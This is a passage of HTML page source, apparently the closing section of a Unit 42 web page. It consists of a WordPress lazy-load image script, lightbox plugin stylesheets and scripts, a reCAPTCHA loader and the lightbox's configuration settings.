                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
